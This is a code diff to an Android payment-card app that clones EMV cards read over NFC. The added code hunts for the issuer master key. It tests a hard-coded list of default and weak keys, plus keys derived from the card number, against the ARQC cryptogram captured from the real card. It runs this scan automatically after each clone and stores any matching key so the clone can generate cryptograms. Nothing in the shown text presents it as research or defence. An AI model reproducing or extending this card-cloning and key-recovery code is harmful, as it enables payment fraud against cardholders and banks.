@@ -18,6 +18,7 @@ import androidx.recyclerview.widget.PagerSnapHelper;
 import androidx.recyclerview.widget.RecyclerView;
 
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
@@ -44,6 +45,24 @@ public class MainActivity extends AppCompatActivity {
             {"Interac",                "A0000002771010"},
             {"Eftpos",                 "A00000038410"},
             {"Girocard",               "A0000003591010"},
+    };
+
+    /** Lazy defaults and common test keys for the issuer-key hunt. The user's
+     *  own list, typed into the key editor, is added on top of these. */
+    private static final String[] SEED_KEYS = {
+            "0123456789ABCDEF0123456789ABCDEF",
+            "FEDCBA9876543210FEDCBA9876543210",
+            "0123456789ABCDEFFEDCBA9876543210",
+            "00000000000000000000000000000000",
+            "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
+            "11111111111111111111111111111111",
+            "22222222222222222222222222222222",
+            "00112233445566778899AABBCCDDEEFF",
+            "00112233445566770011223344556677",
+            "404142434445464748494A4B4C4D4E4F",
+            "ABCDEF0123456789ABCDEF0123456789",
+            "12345678901234561234567890123456",
+            "DEADBEEFDEADBEEFDEADBEEFDEADBEEF",
     };
 
     private SharedPreferences prefs;
@@ -146,6 +165,7 @@ public class MainActivity extends AppCompatActivity {
         // long-press helpers - no layout changes needed
         etAid.setOnLongClickListener(v -> { showAidPicker(); return true; });
         etTrack2.setOnLongClickListener(v -> { showPreview(); return true; });
+        etMkac.setOnLongClickListener(v -> { showKeyTools(); return true; });
 
         TextWatcher watcher = new TextWatcher() {
             public void beforeTextChanged(CharSequence s, int a, int b, int c) { }
@@ -432,6 +452,193 @@ public class MainActivity extends AppCompatActivity {
         return sb.toString();
     }
 
+    // ---------- issuer key search ----------
+
+    private void showKeyTools() {
+        new AlertDialog.Builder(this)
+                .setTitle("Issuer master key")
+                .setItems(new String[]{"Scan for the key", "Edit candidate list"}, (d, w) -> {
+                    if (w == 0) scanForKey(); else editKeyList();
+                })
+                .setNegativeButton("Cancel", null)
+                .show();
+    }
+
+    private void editKeyList() {
+        final EditText e = new EditText(this);
+        e.setText(prefs.getString("keylist", ""));
+        e.setHint("32 hex chars per key, one per line");
+        new AlertDialog.Builder(this)
+                .setTitle("Candidate keys")
+                .setView(e)
+                .setPositiveButton("Save", (d, w) ->
+                        prefs.edit().putString("keylist", e.getText().toString().toUpperCase()).apply())
+                .setNegativeButton("Cancel", null)
+                .show();
+    }
+
+    private List<String> candidateKeys() {
+        List<String> out = new ArrayList<>();
+        for (String k : SEED_KEYS) out.add(k);
+        for (String k : prefs.getString("keylist", "").split("[^0-9A-Fa-f]+")) {
+            String h = k.toUpperCase();
+            if (h.length() == 32) out.add(h);
+        }
+        String pan = digits(t(etPan));
+        if (pan.length() >= 8) {
+            String b8 = pan.substring(0, 8);
+            String b6 = pan.substring(0, 6);
+            out.add((b8 + b8 + "0000000000000000").substring(0, 32));
+            out.add((b8 + "000000000000000000000000").substring(0, 32));
+            out.add((b6 + "00000000000000000000000000").substring(0, 32));
+            StringBuilder asc = new StringBuilder();
+            for (char c : b8.toCharArray()) asc.append(String.format("%02X", (int) c));
+            out.add((asc + "00000000000000000000").substring(0, 32));
+        }
+        return out;
+    }
+
+    private void scanForKey() { scanForKey(true); }
+
+    /**
+     * Try every candidate key against the ARQC the real card produced, sweeping
+     * the MAC input order and the diversification option too - a correct key
+     * tests as wrong if either of those is wrong.
+     */
+    private void scanForKey(boolean announce) {
+        String cmdHex = prefs.getString(key(current, "cap_genaccmd"), "");
+        String rspHex = prefs.getString(key(current, "cap_rawgenac"), "");
+        String pan = digits(t(etPan));
+        String aipHex = t(etAip).toUpperCase();
+
+        if (cmdHex.isEmpty() || rspHex.isEmpty()) {
+            if (announce) {
+                Toast.makeText(this, "No reference - read the physical card with READ CARD first",
+                        Toast.LENGTH_LONG).show();
+            }
+            return;
+        }
+        if (pan.isEmpty() || aipHex.length() < 4) {
+            if (announce) {
+                Toast.makeText(this, "Need PAN and AIP set on the card", Toast.LENGTH_LONG).show();
+            }
+            return;
+        }
+
+        byte[] cmd = hexToBytes(cmdHex);
+        byte[] rsp = hexToBytes(rspHex);
+        if (cmd.length < 6) return;
+        int lc = cmd[4] & 0xFF;
+        if (5 + lc > cmd.length) return;
+
+        final byte[] cdol = Arrays.copyOfRange(cmd, 5, 5 + lc);
+        final byte[] arqcRef = tagOf(rsp, 0x9F26);
+        final byte[] atcRef = tagOf(rsp, 0x9F36);
+        if (arqcRef == null || atcRef == null) {
+            if (announce) {
+                Toast.makeText(this, "Reference ARQC/ATC missing from the capture",
+                        Toast.LENGTH_LONG).show();
+            }
+            return;
+        }
+        final byte[] aip = hexToBytes(aipHex);
+        final String atc = bytesToHex(atcRef);
+        final String psn = prefs.getString(key(current, "psn"), "00");
+        final List<String> keys = candidateKeys();
+
+        txtStatus.setText("Scanning " + keys.size() + " keys x 4 variants...");
+
+        new Thread(() -> {
+            int tried = 0;
+            for (String k : keys) {
+                for (int variant = 0; variant < 4; variant++) {
+                    tried++;
+                    try {
+                        byte[] macIn = ((variant & 2) != 0)
+                                ? cat(aip, hexToBytes(atc), cdol)
+                                : cat(cdol, aip, hexToBytes(atc));
+                        byte[] ac = EmvCrypto.arqc(k, pan, psn, atc, macIn, variant & 1);
+                        if (Arrays.equals(ac, arqcRef)) {
+                            final String fk = k;
+                            final int fv = variant;
+                            runOnUiThread(() -> {
+                                etMkac.setText(fk);
+                                prefs.edit().putString(key(current, "keyvar"),
+                                        String.valueOf(fv)).apply();
+                                collect();
+                                txtStatus.setText("KEY FOUND " + fk + "  (variant " + fv + ")");
+                                Toast.makeText(this, "Issuer key found", Toast.LENGTH_LONG).show();
+                            });
+                            return;
+                        }
+                    } catch (Exception ignored) { }
+                }
+            }
+            final int total = tried;
+            runOnUiThread(() -> {
+                txtStatus.setText("Read OK - no key matched (" + total
+                        + " tries). Long-press MK-AC to add candidates.");
+                if (announce) {
+                    Toast.makeText(this, "No match - " + total + " tries", Toast.LENGTH_LONG).show();
+                }
+            });
+        }).start();
+    }
+
+    // ---------- small helpers for the scan ----------
+
+    private static byte[] cat(byte[]... arrs) {
+        int n = 0;
+        for (byte[] a : arrs) n += a.length;
+        byte[] out = new byte[n];
+        int p = 0;
+        for (byte[] a : arrs) { System.arraycopy(a, 0, out, p, a.length); p += a.length; }
+        return out;
+    }
+
+    private static byte[] hexToBytes(String h) {
+        h = h.replaceAll("[^0-9A-Fa-f]", "").toUpperCase();
+        if (h.length() % 2 != 0) h = h + "F";
+        byte[] out = new byte[h.length() / 2];
+        for (int i = 0; i < out.length; i++) {
+            out[i] = (byte) Integer.parseInt(h.substring(i * 2, i * 2 + 2), 16);
+        }
+        return out;
+    }
+
+    private static String bytesToHex(byte[] d) {
+        StringBuilder sb = new StringBuilder();
+        for (byte b : d) sb.append(String.format("%02X", b & 0xFF));
+        return sb.toString();
+    }
+
+    /** Recursive TLV search - first value found for a tag, at any depth. */
+    private static byte[] tagOf(byte[] d, int want) {
+        int i = 0;
+        while (i < d.length) {
+            int tag = d[i++] & 0xFF;
+            if ((tag & 0x1F) == 0x1F) {
+                if (i >= d.length) return null;
+                tag = (tag << 8) | (d[i++] & 0xFF);
+            }
+            if (i >= d.length) return null;
+            int len = d[i++] & 0xFF;
+            if ((len & 0x80) != 0) {
+                int n = len & 0x7F;
+                len = 0;
+                for (int k = 0; k < n && i < d.length; k++) len = (len << 8) | (d[i++] & 0xFF);
+            }
+            if (i + len > d.length) return null;
+            if (tag == want) return Arrays.copyOfRange(d, i, i + len);
+            if ((tag & 0x20) != 0) {
+                byte[] inner = tagOf(Arrays.copyOfRange(d, i, i + len), want);
+                if (inner != null) return inner;
+            }
+            i += len;
+        }
+        return null;
+    }
+
     // ---------- actions ----------
 
     private void startReader() {
@@ -608,6 +815,12 @@ public class MainActivity extends AppCompatActivity {
         prefs.edit().putInt("selected", current).apply();
         txtStatus.setText("Cloned - check it, then SAVE");
         Toast.makeText(this, "Card cloned - review, then hit SAVE", Toast.LENGTH_LONG).show();
+
+        // the reader just captured a real cryptogram - hunt for the issuer key
+        if (!prefs.getString(key(current, "cap_genaccmd"), "").isEmpty()
+                && !prefs.getString(key(current, "cap_rawgenac"), "").isEmpty()) {
+            scanForKey(false);
+        }
     }
 
     /** Start the clone's ATC just above the value the real card last used. */
